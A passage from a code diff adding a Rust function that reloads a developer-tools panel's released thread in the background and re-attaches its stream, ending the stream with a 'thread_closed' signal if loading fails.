+/// Loads the panel's released devtools thread again in the background and puts the stream back
+/// on it with a fresh snapshot; the panel is not told the thread closed. A load that fails ends
+/// the stream with `thread_closed`, and the panel re-subscribes (design.md §A3). Entered from a
+/// deferred review, at top level (GOTCHA G17).
+fn reload_panel_stream(id: SessionId, reload: Reload, cx: &mut App) {
+    let loading = crate::devtools_threads::ensure_loaded(&reload.thread_id, cx);
+    cx.spawn(async move |cx| {
+        let loaded = loading.await;
+        cx.update(|cx| finish_reload(&id, reload, loaded, cx));
+    })
